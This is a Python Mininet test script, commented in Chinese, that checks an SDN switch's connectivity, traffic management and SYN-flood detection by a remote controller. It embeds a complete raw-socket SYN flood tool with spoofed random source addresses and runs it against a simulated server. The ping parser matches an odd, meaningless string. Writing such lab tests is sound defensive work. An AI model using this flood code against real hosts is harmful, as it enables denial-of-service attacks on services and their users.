#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Mininet 測試腳本 - 用於測試進階交換機功能
包含基本連通性測試、多表處理測試和 DDoS 攻擊模擬
"""

from mininet.net import Mininet
from mininet.node import Controller, RemoteController, OVSKernelSwitch
from mininet.cli import CLI
from mininet.log import setLogLevel, info
from mininet.link import TCLink
from mininet.topo import Topo
from mininet.util import dumpNodeConnections
import time
import sys
import os
import random
import argparse
from threading import Thread
import subprocess

class AdvancedTestTopo(Topo):
    """自定義拓撲結構測試進階功能"""
    
    def build(self, n=4):
        """建立拓撲 - 默認4台主機"""
        # 添加交換機
        s1 = self.addSwitch('s1')
        
        # 添加主機和鏈路
        hosts = []
        for i in range(1, n+1):
            h = self.addHost(f'h{i}',
                             ip=f'10.0.0.{i}/24',
                             mac=f'00:00:00:00:00:{i:02d}')
            self.addLink(h, s1, bw=10, delay='1ms')
            hosts.append(h)
            
        # 為負載均衡和故障轉移測試設置額外主機
        server1 = self.addHost('server1', ip='10.0.0.101/24', mac='00:00:00:00:00:65')
        server2 = self.addHost('server2', ip='10.0.0.102/24', mac='00:00:00:00:00:66')
        self.addLink(server1, s1, bw=20, delay='1ms')
        self.addLink(server2, s1, bw=20, delay='1ms')

def run_ping_test(net, hosts=None, verbose=True):
    """
    執行 Ping 測試並顯示結果
    """
    if not hosts:
        hosts = net.hosts
    
    info("*** 執行 Ping 測試\n")
    packet_loss = {}
    
    for src in hosts:
        for dst in hosts:
            if src != dst:
                if verbose:
                    info(f"從 {src.name} ping 到 {dst.name}: ")
                result = src.cmd(f"ping -c 3 -q {dst.IP()}")
                sent, received = 0, 0
                for line in result.split('\n'):
                    if '申苑傳' in line or 'transmitted' in line:
                        stats = line.split()
                        try:
                            sent = int(stats[0])
                            received = int(stats[3])
                        except (IndexError, ValueError):
                            continue
                
                loss = 100.0
                if sent > 0:
                    loss = 100.0 - (received / sent * 100.0)
                
                packet_loss[(src.name, dst.name)] = loss
                
                if verbose:
                    if loss == 0:
                        info("成功\n")
                    else:
                        info(f"失敗 (丟包率: {loss:.1f}%)\n")
    
    # 顯示整體統計
    total_tests = len(packet_loss)
    failed_tests = sum(1 for loss in packet_loss.values() if loss > 0)
    
    info(f"*** Ping 測試結果: {failed_tests}/{total_tests} 測試失敗 ({failed_tests/total_tests*100:.1f}%)\n")
    return packet_loss

def test_basic_connectivity(net):
    """測試基本連通性功能"""
    info("\n*** 測試基本連通性\n")
    run_ping_test(net)
    
    # 顯示 dump 信息
    info("\n*** 顯示網絡信息\n")
    dumpNodeConnections(net.hosts)
    net.pingAll()

def run_syn_flood(host, target_ip, target_port, duration=10, count=1000):
    """
    在指定主機上運行 SYN flood 攻擊
    
    參數:
        host: Mininet主機對象
        target_ip: 目標IP地址
        target_port: 目標端口
        duration: 攻擊持續時間（秒）
        count: 每秒發送的SYN包數量
    """
    info(f"*** 從 {host.name} 開始對 {target_ip}:{target_port} 進行 SYN flood 攻擊\n")
    
    # 創建一個臨時SYN flood腳本
    syn_flood_script = r"""#!/usr/bin/env python3
import socket
import random
import time
import sys
from struct import *

def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        if i+1 < len(msg):
            w = (msg[i] << 8) + msg[i+1]
        else:
            w = (msg[i] << 8)
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def create_syn_packet(src_ip, dst_ip, dst_port):
    # IP header
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0  # 内核會填充
    ip_id = random.randint(1, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0  # 稍後計算
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)
    
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    
    # IP頭部
    ip_header = pack('!BBHHHBBH4s4s',
                    ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                    ip_frag_off, ip_ttl, ip_proto, ip_check,
                    ip_saddr, ip_daddr)
    
    # TCP header
    tcp_source = random.randint(1024, 65535)
    tcp_dest = dst_port
    tcp_seq = random.randint(1000000000, 4000000000)
    tcp_ack_seq = 0
    tcp_doff = 5  # 4位首部長度，表示頭部有5個（32比特）字
    tcp_fin = 0
    tcp_syn = 1
    tcp_rst = 0
    tcp_psh = 0
    tcp_ack = 0
    tcp_urg = 0
    tcp_window = socket.htons(5840)
    tcp_check = 0  # 稍後計算
    tcp_urg_ptr = 0
    
    tcp_offset_res = (tcp_doff << 4) + 0
    tcp_flags = (tcp_fin) + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
    
    tcp_header = pack('!HHLLBBHHH',
                     tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                     tcp_offset_res, tcp_flags, tcp_window,
                     tcp_check, tcp_urg_ptr)
    
    # 偽造頭部以計算校驗和
    source_address = socket.inet_aton(src_ip)
    dest_address = socket.inet_aton(dst_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    
    psh = pack('!4s4sBBH',
              source_address, dest_address,
              placeholder, protocol, tcp_length)
    psh = psh + tcp_header
    
    tcp_check = checksum(psh)
    
    # 重建頭部
    tcp_header = pack('!HHLLBBH',
                     tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                     tcp_offset_res, tcp_flags, tcp_window) + \
                pack('H', tcp_check) + \
                pack('!H', tcp_urg_ptr)
    
    # 完整封包
    packet = ip_header + tcp_header
    return packet

def syn_flood():
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    count = int(sys.argv[4])
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        packets_sent = 0
        end_time = time.time() + duration
        
        while time.time() < end_time:
            for _ in range(count):
                # 生成隨機源IP
                src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                
                packet = create_syn_packet(src_ip, target_ip, target_port)
                s.sendto(packet, (target_ip, 0))
                packets_sent += 1
                
            time.sleep(0.01)  # 稍微暫停避免系統過載
            
        print(f"SYN flood完成。已發送 {packets_sent} 個封包到 {target_ip}:{target_port}")
        
    except socket.error as e:
        print(f"錯誤: {e}")
    except KeyboardInterrupt:
        print("攻擊被用戶中止")

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print(f"用法: {sys.argv[0]} <目標IP> <目標端口> <持續時間(秒)> <每秒包數>")
        sys.exit(1)
    
    syn_flood()
"""
    
    # 將腳本寫入臨時文件
    script_path = f"/tmp/syn_flood_{host.name}.py"
    with open(script_path, 'w') as f:
        f.write(syn_flood_script)
    os.chmod(script_path, 0o755)
    
    # 在主機上運行攻擊
    cmd = f"python3 {script_path} {target_ip} {target_port} {duration} {count}"
    attack_thread = Thread(target=lambda: host.cmd(cmd))
    attack_thread.daemon = True
    attack_thread.start()
    
    return attack_thread

def test_syn_flood_detection(net):
    """測試SYN flood偵測功能"""
    info("\n*** 測試SYN Flood偵測功能\n")
    h1 = net.get('h1')
    server1 = net.get('server1')
    
    # 首先確保伺服器可以Ping通
    info("*** 確保伺服器可連接\n")
    result = h1.cmd(f"ping -c 3 -q {server1.IP()}")
    info(f"Ping結果: {result}\n")
    
    # 啟動TCP伺服器於server1
    info("*** 在伺服器上啟動TCP測試服務\n")
    server_cmd = f"python3 -m http.server 80 &"
    server1.cmd(server_cmd)
    time.sleep(2)  # 等待服務器啟動
    
    # 執行SYN flood攻擊
    info("*** 開始SYN Flood攻擊測試\n")
    attack_thread = run_syn_flood(h1, server1.IP(), 80, duration=30, count=200)
    
    # 等待攻擊完成
    info("*** 等待控制器偵測攻擊 (30秒)...\n")
    time.sleep(30)
    
    # 停止伺服器
    server1.cmd("pkill -f 'python3 -m http.server'")
    info("*** SYN Flood測試完成\n")

def test_traffic_management(net):
    """測試流量管理功能 (多表、群組表、計量表)"""
    info("\n*** 測試流量管理功能\n")
    
    h1 = net.get('h1')
    h2 = net.get('h2')
    server1 = net.get('server1')
    server2 = net.get('server2')
    
    # 設置伺服器
    info("*** 設置測試服務器\n")
    server1.cmd("python3 -m http.server 80 &")
    server2.cmd("python3 -m http.server 80 &")
    time.sleep(2)
    
    # 測試多表路由
    info("*** 測試多表路由 - 訪問HTTP服務器\n")
    h1.cmd(f"wget -q -O /dev/null {server1.IP()}")
    h2.cmd(f"wget -q -O /dev/null {server2.IP()}")
    
    # 模擬不同類型的流量
    info("*** 測試QoS計量表 - 生成不同類型的流量\n")
    
    # 普通流量
    h1.cmd(f"ping -c 100 -i 0.01 {h2.IP()} > /dev/null &")
    
    # 流媒體流量 (大量TCP流量到80端口)
    h1.cmd(f"for i in {{1..100}}; do wget -q -O /dev/null {server1.IP()} & done")
    
    # 備份流量 (21端口)
    h1.cmd(f"nc -zv {server1.IP()} 21")
    
    # 關鍵業務流量 (25端口)
    h1.cmd(f"nc -zv {server1.IP()} 25")
    
    # 等待控制器處理
    info("*** 等待控制器處理各種流量...\n")
    time.sleep(10)
    
    # 清理
    server1.cmd("pkill -f 'python3 -m http.server'")
    server2.cmd("pkill -f 'python3 -m http.server'")
    h1.cmd("pkill -f ping")
    h1.cmd("pkill -f wget")
    h1.cmd("pkill -f nc")
    
    info("*** 流量管理測試完成\n")

def main():
    # 解析命令行參數
    parser = argparse.ArgumentParser(description='進階交換機測試工具')
    parser.add_argument('--test', choices=['all', 'basic', 'synflood', 'traffic'], 
                        default='all', help='指定要運行的測試')
    args = parser.parse_args()
    
    # 設置日誌級別
    setLogLevel('info')
    
    # 創建拓撲
    topo = AdvancedTestTopo(n=4)
    
    # 創建網絡 - 使用遠程控制器和OpenFlow 1.3
    info('*** 創建網絡\n')
    # 使用特定的控制器 IP 和端口
    controller_ip = "192.168.1.102"
    controller_port = 6653
    info(f'*** 連接到控制器 {controller_ip}:{controller_port}\n')
    
    net = Mininet(topo=topo, controller=RemoteController('c0', ip=controller_ip, port=controller_port),
                  switch=OVSKernelSwitch, autoSetMacs=True, link=TCLink)
    
    # 設置OpenFlow 1.3
    info('*** 設置OpenFlow 1.3\n')
    for switch in net.switches:
        info(f"配置 {switch.name} 使用 OpenFlow 1.3\n")
        switch.cmd('ovs-vsctl set bridge s1 protocols=OpenFlow13')
    
    # 啟動網絡
    info('*** 啟動網絡\n')
    net.start()
    
    # 等待控制器初始化完成
    info('*** 等待控制器初始化 (5秒)...\n')
    time.sleep(5)
    
    # 根據指定的測試運行相應功能
    if args.test == 'all' or args.test == 'basic':
        test_basic_connectivity(net)
    
    if args.test == 'all' or args.test == 'synflood':
        test_syn_flood_detection(net)
    
    if args.test == 'all' or args.test == 'traffic':
        test_traffic_management(net)
    
    # 啟動CLI
    info('*** 啟動命令行界面\n')
    CLI(net)
    
    # 停止網絡
    info('*** 停止網絡\n')
    net.stop()

if __name__ == '__main__':
    # 需要root權限運行Mininet
    if os.geteuid() != 0:
        info("請使用sudo運行此腳本\n")
        exit(1)
    
    main()
